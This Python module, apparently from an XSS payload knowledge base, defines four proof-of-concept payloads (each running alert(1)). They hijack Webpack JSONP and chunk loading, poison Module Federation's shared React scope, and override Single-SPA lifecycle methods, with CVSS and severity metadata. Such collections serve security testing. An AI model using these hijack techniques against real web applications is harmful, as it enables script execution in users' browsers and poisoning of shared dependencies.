#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Webpack & Micro-Frontend Hijacking Payloads
"""

from ..models import PayloadEntry

WEBPACK_HIJACK_PAYLOADS = {
    "webpack_jsonp_hijack": PayloadEntry(
        payload="window.webpackJsonp.push([['app'],{'./src/index.js':function(m,e,r){alert(1)}},[['./src/index.js']]]);",
        contexts=["javascript", "module_federation"],
        severity="critical",
        cvss_score=9.0,
        description="Hijacking Webpack 4 webpackJsonp global to execute arbitrary code",
        tags=["webpack", "jsonp", "hijack", "rce"],
        reliability="high",
        attack_surface="global-scope",
    ),
    "webpack_chunk_load_override": PayloadEntry(
        payload="window.webpackChunk_name.push([[1],{},function(r){r.e=function(){return Promise.resolve()};alert(1)}])",
        contexts=["javascript", "module_federation"],
        severity="critical",
        cvss_score=9.0,
        description="Webpack 5 chunk loading override XSS",
        tags=["webpack5", "chunk-loading", "hijack"],
        reliability="high",
        attack_surface="global-scope",
    ),
    "module_federation_share_scope": PayloadEntry(
        payload="window.__webpack_share_scopes__.default.react.get=()=>Promise.resolve(()=>({createElement:()=>alert(1)}));",
        contexts=["javascript", "module_federation"],
        severity="critical",
        cvss_score=9.5,
        description="Polluting Module Federation shared scope to poison React dependency",
        tags=["webpack", "module-federation", "supply-chain", "poisoning"],
        reliability="medium",
        attack_surface="shared-memory",
    ),
    "single_spa_mount_override": PayloadEntry(
        payload="System.import('app-name').then(m=>{m.mount=()=>alert(1)})",
        contexts=["javascript", "module_federation"],
        severity="high",
        cvss_score=8.5,
        description="Overriding Single-SPA lifecycle method",
        tags=["single-spa", "systemjs", "lifecycle"],
        reliability="medium",
        attack_surface="global-registry",
    ),
}

WEBPACK_HIJACK_TOTAL = len(WEBPACK_HIJACK_PAYLOADS)
